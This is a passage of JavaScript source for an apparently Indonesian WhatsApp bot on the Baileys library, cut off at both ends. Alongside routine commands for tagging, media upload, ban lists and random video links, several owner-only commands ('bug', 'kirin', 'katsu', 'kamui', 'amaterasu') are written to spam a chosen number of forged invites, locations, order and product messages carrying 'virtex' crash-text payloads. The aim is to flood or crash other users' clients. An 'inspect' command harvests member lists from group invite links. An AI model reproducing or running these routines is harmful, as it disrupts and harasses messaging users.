            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    
    case 'tourl':
            if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            owgi = await xdev.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    
    
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             xdev.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
             
            case 'setppbot':
					if (!isOwner) return reply3('Kalau Bukan Owner Gak Usah Banyak Tingkah Deh')
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(enmedia)
					await xdev.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😗')
					break
					
										case 'sider':
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break

					case 'banchat':
if (!isGroup) return reply(mess.only.group)

if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break


					

case 'unbanchat':
				if (!isOwner) return 
					try {
if (!isBanchat) return reply(`udah di UnBan`)
let anu = bancht.indexOf(from)
bancht.splice(anu, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
} catch (err){
						console.log(err)
						sendSticker(emror, sticker)
					}
					break




case 'infoall': case 'tagall':

if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ▢@${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`
*From :* ${pushname}

 Info :  ${q}

Total Member : ${groupMembers.length} 

┏━「 ${fake} 」`+teks+`┗━「 ${fake} 」`, members_id, false)
break


case 'bug':
                        if (!isOwner) return 
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
function bug(jid){
for(let i=0;i < 1;i++){
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
 xdev.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)}}	
async function attack(targett){
bug(targett)}
attack(dev.key.remoteJid)
}
break





 
 
 case 'kirin':
           if (!isOwner) return sendvn(wuy)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                        'groupName': fake1,
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })        
           }
           break
 
 
 
 case 'katsu':
           if (!isOwner) return sendvn(wuy)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: forward})
                             
           }
           break
           
           
           case 'kamui':
           if (!isOwner) return sendvn(wuy)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake1,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: forward
                });
                 xdev.relayWAMessage(kirin)
                             
           }
           break
 
 
 
 


case 'amaterasu':
      if(!isOwner) return reply('*Khusus owner*')
{
var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': philip(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirim)
                 
                 
                 
         xdev.sendMessage(from, virtex8(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
                })
                
                
                xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    })        
                
                
                xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: {forwardingScore: 100000000, isForwarded: true}})
                             
                             hmm4 = fs.readFileSync('./stik/trava1.jpg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': {
                                'forwardingScore': 100000000,
                                'isForwarded': true,
                                'sendEphemeral': true
                            }
                        }
                    }, {
                  contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    }), 
                  xdev.relayWAMessage(res)
                             
                             
                             
                    
                    const nana = fs.readFileSync('./stik/trava.jpg');
                        xdev.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
                        
                        
                        var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake1,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirin)
                        
                        
                    
 kok = fs.readFileSync('./lib/amaterasu.mp3')
await xdev.sendMessage(from, kok, audio, {  'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': 4,
                                    'status': 1,
                                    'surface': 1,
                                     'message': 'NOPE',
                                    'orderTitle': fake,
                                    'thumbnail': virgam,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }, caption: virtex7(prefix),
                   
                })
             
                }

break

 
 
 
 
 
 
 
 
 
 
 
 
 
/*buttons = [{buttonId: `${prefix}warmode on`, buttonText: {displayText: 'AKTIFKAN'}, type: 1}, {buttonId: `${prefix}warmode off`, buttonText: {displayText: 'MATIKAN'}, type: 1}]
                   buttonsMessage = {footerText:'Klik aktifkan', 
                  contentText:`Harus mengaktifkan warmode dulu`,buttons,headerType:1}
                  prep = await xdev.prepareMessageFromContent(from,{buttonsMessage},{quoted: dev})
					if (!isWarmode) return xdev.relayWAMessage(prep)*/


 
 
case 'donasi':
console.log('DONASI')
xdev.sendMessage(from, donasi.dodo(prefix), text, {quoted: dev})
break
 
 
 
 
 
 

 
 
 
 case 'creator':
case 'developer':
		case 'author':
let ini_list = []
for (let i of Ownerin) {
const vname = xdev.contacts[i] != undefined ? xdev.contacts[i].vname || xdev.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer ${fake}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Dcode Denpa;;;\nFN:${vname ? `${vname}` : `${xdev.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
xdev.sendMessage(from, {
"displayName": `Developer ${fake}`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: dev, contextInfo: forward})
break
 
 
 
 
 
 
 case "owner":
        sendKontak(from, nomerOwner, namalu, "Sibuk");
        break;
 
 
 
 
 
 
 
 
 
 
 
 
 

                
                
 
 
 
 
 





				












 
 
 
 
 
 
 
 
 
 
 
 
 
default:
   
                        if (nopref === false && isCmd) {

                        if (timeWib >= '01:00:00' && timeWib <= '04:00:30')  return
                        if(budy.includes('kirara')) return jawab (`hai kak ${pushname} kalo panggil aku jangan pake tanda titik 😐`)             
                    	if (isSpammerr) return sendSticker(spam2, sticker)
                        if(autovn === true) return xdev.sendMessage(from, yaampun, audio, {mimetype: 'audio/mp4', quoted: dev, ptt: true})
                        const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
                                           './respon/sticker10.webp',
                                           './respon/sticker11.webp','./respon/sticker13.webp',
                                           './respon/sticker21.webp']
                   
					const su = kta[Math.floor(Math.random() * kta.length)]
					halo = fs.readFileSync(`${su}`)
                        if(autosticker === true) return  xdev.sendMessage(from, halo, sticker, {quoted: dev, contextInfo : forward})
			
					
					             xdev.sendMessage(from, kentod, text, {quoted : dev})
					}
					       
					       
          

	
     
                   
                    

                    
       
       
       
       

       
       
       
       
                       
                  if(budy.includes("Not expecting a response")){
                  if(!isOwner) return
                  reply("Sinyalnya jelek 😕")
                  }
                   
                   
                   if (budy.includes('Bokep')){
                   	  if(isExtream) return
                   	if (isOwner) return 
                   if (isSpammerr) return 
		          spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
	            setTimeout( () => {
                 sendSticker(hah, sticker)
                 },0)
                 setTimeout( () => {
                 sendSticker(mintadong, sticker)
                 },4000)
                 setTimeout( () => {
                 sendSticker1(tapiboong, sticker)
                 },15000)
                   }
                   
                    if (budy.includes('bokep')){
                      if(isExtream) return
                    		if (isOwner) return 
                    if (isSpammerr) return 
		           spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },60000)
	            setTimeout( () => {
                 sendSticker(hah, sticker)
                 },0)
                 setTimeout( () => {
                 sendSticker(jotos, sticker)
                 },4000)
                   }
                   

                  
                  
                  
                  
                  
                 
                 
        if (budy.includes(`usik`)) {
                  	  if (isOwner) return
                  	if (isSpammerr) return sendSticker(spam2, sticker)
                  reply(`*Hai kak ${pushname} untuk mengakses musik bisa ketik ${prefix}vnlist atau ketik ${prefix}musik yah* 🙂`)
                  }
                  

					
			
	
            



 


	if (responseButton == 'chika') {
    var ini_chika = ['https://e.top4top.io/m_20449tcq71.mp4', 'https://c.top4top.io/m_204409rac1.mp4', 'https://d.top4top.io/m_2044grrvq1.mp4', 'https://a.top4top.io/m_20447gp2m1.mp4', 'https://b.top4top.io/m_2044tms6o1.mp4', 'https://l.top4top.io/m_2044bpcnz1.mp4', 'https://k.top4top.io/m_2044djvwa1.mp4', 'https://i.top4top.io/m_2044edr6b1.mp4', 'https://j.top4top.io/m_20440trai1.mp4', 'https://h.top4top.io/m_20444e0od1.mp4', 'https://f.top4top.io/m_2044sd4yj1.mp4', 'https://g.top4top.io/m_2044pbyik1.mp4', 'https://e.top4top.io/m_2044plq2c1.mp4', 'https://c.top4top.io/m_20444gxgc1.mp4', 'https://d.top4top.io/m_2044huvjs1.mp4', 'https://k.top4top.io/m_2044jizu61.mp4', 'https://l.top4top.io/m_2044tz4ks1.mp4', 'https://a.top4top.io/m_2044jn6161.mp4', 'https://h.top4top.io/m_2044gcixv1.mp4', 'https://g.top4top.io/m_20444c9161.mp4', 'https://j.top4top.io/m_2044ptrlc1.mp4', 'https://i.top4top.io/m_2044pwj221.mp4', 'https://f.top4top.io/m_2044wk7cs1.mp4', 'https://e.top4top.io/m_2044z3oq91.mp4', 'https://d.top4top.io/m_2044pzqsv1.mp4'];
    var random_chika = ini_chika[Math.floor(Math.random() * (ini_chika.length))];
    let buff = await getBuffer(random_chika);
    xdev.sendMessage(from, buff, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'delvira') {
    reply(mess.wait);
    var delvira = ['https://h.top4top.io/m_2045q48rg1.mp4', 'https://i.top4top.io/m_204581d7k1.mp4', 'https://j.top4top.io/m_2045uhkes1.mp4', 'https://g.top4top.io/m_2045l52is1.mp4', 'https://i.top4top.io/m_2045ai8cb1.mp4', 'https://d.top4top.io/m_2045u59ck1.mp4', 'https://f.top4top.io/m_204582jv91.mp4', 'https://e.top4top.io/m_2045l4uit1.mp4', 'https://g.top4top.io/m_20450f0kl1.mp4', 'https://a.top4top.io/m_2045pd6r01.mp4', 'https://c.top4top.io/m_2045g84yn1.mp4', 'https://h.top4top.io/m_2045t100r1.mp4', 'https://j.top4top.io/m_2045en2j01.mp4', 'https://b.top4top.io/m_2045upgh01.mp4', 'https://l.top4top.io/m_2045pu58m1.mp4', 'https://k.top4top.io/m_2045i29cg1.mp4', 'https://e.top4top.io/m_2045q6mkm1.mp4', 'https://f.top4top.io/m_2045jl1jg1.mp4', 'https://c.top4top.io/m_20450bu4q1.mp4', 'https://d.top4top.io/m_2045wojl61.mp4'];
    var random_delvira = delvira[Math.floor(Math.random() * (delvira.length))];
    let ini_delvira = await getBuffer(random_delvira);
    xdev.sendMessage(from, ini_delvira, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ayu') {
    reply(mess.wait);
    var ayu = ['https://h.top4top.io/m_2045353te1.mp4', 'https://i.top4top.io/m_2045uveyv1.mp4', 'https://g.top4top.io/m_2045mt9ww1.mp4', 'https://f.top4top.io/m_20450uurm1.mp4', 'https://c.top4top.io/m_2045qmp741.mp4', 'https://e.top4top.io/m_20452j1l01.mp4', 'https://b.top4top.io/m_2045k8f751.mp4', 'https://a.top4top.io/m_2045eg2jp1.mp4', 'https://d.top4top.io/m_2045jcjsl1.mp4', 'https://h.top4top.io/m_2045tjyl81.mp4', 'https://j.top4top.io/m_204595j5b1.mp4', 'https://d.top4top.io/m_2045crady1.mp4', 'https://g.top4top.io/m_20457ii1t1.mp4', 'https://k.top4top.io/m_2045zmfgu1.mp4', 'https://b.top4top.io/m_204514isy1.mp4', 'https://e.top4top.io/m_2045ryncv1.mp4', 'https://f.top4top.io/m_20456rgqd1.mp4', 'https://i.top4top.io/m_2045ie5dw1.mp4', 'https://l.top4top.io/m_2045o7w9v1.mp4', 'https://c.top4top.io/m_2045hcjnm1.mp4'];
    var random_ayu = ayu[Math.floor(Math.random() * (ayu.length))];
    let ini = await getBuffer(random_ayu);
    xdev.sendMessage(from, ini_ayu, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bunga') {
    reply(mess.wait);
    var bunga = ['https://d.top4top.io/m_2045ln0hy1.mp4', 'https://b.top4top.io/m_2045wt4lb1.mp4', 'https://a.top4top.io/m_2045s3khl1.mp4', 'https://f.top4top.io/m_2045jb2va1.mp4', 'https://l.top4top.io/m_2045c7vqm1.mp4', 'https://k.top4top.io/m_20459shmj1.mp4', 'https://b.top4top.io/m_2045v82yo1.mp4', 'https://h.top4top.io/m_20458jkj91.mp4', 'https://f.top4top.io/m_2045becu81.mp4', 'https://i.top4top.io/m_204546wbm1.mp4', 'https://e.top4top.io/m_20455p1.mp4', 'https://i.top4top.io/m_204573y8p1.mp4', 'https://h.top4top.io/m_204519hat1.mp4', 'https://k.top4top.io/m_204502t021.mp4', 'https://l.top4top.io/m_2045ex4p81.mp4', 'https://g.top4top.io/m_2045f693d1.mp4', 'https://j.top4top.io/m_2045ypbga1.mp4', 'https://d.top4top.io/m_2045kzqx61.mp4', 'https://j.top4top.io/m_2045ltjq51.mp4', 'https://c.top4top.io/m_20456e8wc1.mp4', 'https://c.top4top.io/m_2045oggyg1.mp4', 'https://g.top4top.io/m_204545km11.mp4', 'https://e.top4top.io/m_2045mbr0w1.mp4'];
    var random_bunga = bunga[Math.floor(Math.random() * (bunga.length))];
    let ini_bunga = await getBuffer(random_bunga);
    xdev.sendMessage(from, ini_bunga, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'aura') {
    reply(mess.wait);
    var aura = ['https://g.top4top.io/m_2045kg02x1.mp4', 'https://f.top4top.io/m_2045bzzv61.mp4', 'https://e.top4top.io/m_2045u39bp1.mp4', 'https://c.top4top.io/m_2045nz5y81.mp4', 'https://b.top4top.io/m_2045bd5nx1.mp4', 'https://d.top4top.io/m_2045falge1.mp4', 'https://a.top4top.io/m_2045eljtw1.mp4', 'https://l.top4top.io/m_2045kcp201.mp4', 'https://j.top4top.io/m_2045at6161.mp4', 'https://i.top4top.io/m_2045nmmpu1.mp4', 'https://k.top4top.io/m_2045zox271.mp4', 'https://h.top4top.io/m_2045qzh0s1.mp4', 'https://g.top4top.io/m_2045bg23m1.mp4', 'https://e.top4top.io/m_20456vum81.mp4', 'https://c.top4top.io/m_2045vew941.mp4', 'https://d.top4top.io/m_20450ihor1.mp4', 'https://f.top4top.io/m_2045qyei51.mp4', 'https://b.top4top.io/m_2045pn2wh1.mp4', 'https://k.top4top.io/m_20457x5tn1.mp4', 'https://a.top4top.io/m_2045vc1vm1.mp4', 'https://l.top4top.io/m_2045bqxm91.mp4'];
    var random_aura = aura[Math.floor(Math.random() * (aura.length))];
    let ini_aura = await getBuffer(random_aura);
    xdev.sendMessage(from, ini_aura, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'nisa') {
    reply(mess.wait);
    var nisa = ['https://i.top4top.io/m_2045a62xr1.mp4', 'https://f.top4top.io/m_2045ag1ah1.mp4', 'https://h.top4top.io/m_2045aao0z1.mp4', 'https://g.top4top.io/m_20452ycpb1.mp4', 'https://d.top4top.io/m_2045w6bhe1.mp4', 'https://e.top4top.io/m_2045xra1y1.mp4', 'https://l.top4top.io/m_2045t75ik1.mp4', 'https://c.top4top.io/m_2045tekbe1.mp4', 'https://b.top4top.io/m_20452iret1.mp4', 'https://a.top4top.io/m_2045mx50v1.mp4', 'https://j.top4top.io/m_2045p4i5g1.mp4', 'https://k.top4top.io/m_2045ka8zl1.mp4', 'https://i.top4top.io/m_2045ugp6n1.mp4', 'https://f.top4top.io/m_20452avj31.mp4', 'https://e.top4top.io/m_2045nb03l1.mp4', 'https://g.top4top.io/m_2045x4itm1.mp4', 'https://c.top4top.io/m_2045riu151.mp4', 'https://d.top4top.io/m_2045fz1ic1.mp4', 'https://l.top4top.io/m_2045i393z1.mp4', 'https://b.top4top.io/m_2045ws5mp1.mp4', 'https://k.top4top.io/m_20459e8w41.mp4', 'https://j.top4top.io/m_204558yj01.mp4', 'https://a.top4top.io/m_20457ksoh1.mp4', 'https://i.top4top.io/m_2045dk4sl1.mp4'];
    var random_nisa = nisa[Math.floor(Math.random() * (nisa.length))];
    let ini_nisa = await getBuffer(random_nisa);
    xdev.sendMessage(from, ini_nisa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ziva') {
    reply(mess.wait);
    var ziva = ['https://a.top4top.io/m_2045w0s1a1.mp4', 'https://d.top4top.io/m_2045xs8yi1.mp4', 'https://b.top4top.io/m_2045azqmo1.mp4', 'https://f.top4top.io/m_2045two7u1.mp4', 'https://c.top4top.io/m_2045qyybj1.mp4', 'https://e.top4top.io/m_20451udwa1.mp4', 'https://g.top4top.io/m_2045wf56i1.mp4', 'https://j.top4top.io/m_2045eygb01.mp4', 'https://l.top4top.io/m_2045wc7px1.mp4', 'https://c.top4top.io/m_2045w1vo91.mp4', 'https://d.top4top.io/m_20456rh231.mp4', 'https://l.top4top.io/m_2045alof61.mp4', 'https://h.top4top.io/m_2045r85wl1.mp4', 'https://e.top4top.io/m_20451kltw1.mp4', 'https://g.top4top.io/m_20459k8ps1.mp4', 'https://f.top4top.io/m_2045ldcsq1.mp4', 'https://f.top4top.io/m_2045hvozl1.mp4', 'https://c.top4top.io/m_20452p34z1.mp4', 'https://l.top4top.io/m_2045msq4m1.mp4', 'https://i.top4top.io/m_20457dpjf1.mp4', 'https://k.top4top.io/m_2045252vc1.mp4', 'https://h.top4top.io/m_2045hmckz1.mp4', 'https://a.top4top.io/m_20457d0zk1.mp4', 'https://i.top4top.io/m_2045x1txz1.mp4', 'https://g.top4top.io/m_2045vh0di1.mp4', 'https://g.top4top.io/m_2045yl2it1.mp4', 'https://d.top4top.io/m_20456hnro1.mp4', 'https://k.top4top.io/m_20452q7ko1.mp4', 'https://k.top4top.io/m_20456hkh61.mp4', 'https://a.top4top.io/m_2045ytjc41.mp4', 'https://h.top4top.io/m_2045iwljm1.mp4', 'https://e.top4top.io/m_2045cuwm51.mp4', 'https://i.top4top.io/m_2045d43m11.mp4', 'https://b.top4top.io/m_2045qlcbo1.mp4', 'https://j.top4top.io/m_2045ym82h1.mp4', 'https://j.top4top.io/m_2045bew1l1.mp4', 'https://b.top4top.io/m_2045ythaz1.mp4'];
    var random_ziva = ziva[Math.floor(Math.random() * (ziva.length))];
    let ini_ziva = await getBuffer(random_ziva);
    xdev.sendMessage(from, ini_ziva, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'yana') {
    reply(mess.wait);
    var yana = ['https://g.top4top.io/m_2045p55sm1.mp4', 'https://f.top4top.io/m_2045o2z231.mp4', 'https://h.top4top.io/m_2045na6v81.mp4', 'https://i.top4top.io/m_2045cdyjt1.mp4', 'https://c.top4top.io/m_2045ro9xo1.mp4', 'https://b.top4top.io/m_2045edz2q1.mp4', 'https://a.top4top.io/m_2045ybdlt1.mp4', 'https://i.top4top.io/m_2045kk4t61.mp4', 'https://d.top4top.io/m_2045ehl6b1.mp4', 'https://k.top4top.io/m_20454zh0e1.mp4', 'https://l.top4top.io/m_2045y6bfe1.mp4', 'https://j.top4top.io/m_2045wxx3t1.mp4', 'https://h.top4top.io/m_2045cyk6a1.mp4', 'https://g.top4top.io/m_2045buha21.mp4', 'https://c.top4top.io/m_2045jzgsn1.mp4', 'https://e.top4top.io/m_2045dd9x11.mp4', 'https://d.top4top.io/m_2045dg6hl1.mp4', 'https://b.top4top.io/m_2045zmtsq1.mp4', 'https://f.top4top.io/m_2045m94wa1.mp4', 'https://a.top4top.io/m_2045d8rwp1.mp4', 'https://l.top4top.io/m_2045l80391.mp4', 'https://k.top4top.io/m_20458j0dc1.mp4', 'https://j.top4top.io/m_2045hh4741.mp4', 'https://i.top4top.io/m_2045xk4x71.mp4'];
    var random_yana = yana[Math.floor(Math.random() * (yana.length))];
    let ini_yana = await getBuffer(random_yana);
    xdev.sendMessage(from, ini_yana, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'viona') {
    reply(mess.wait);
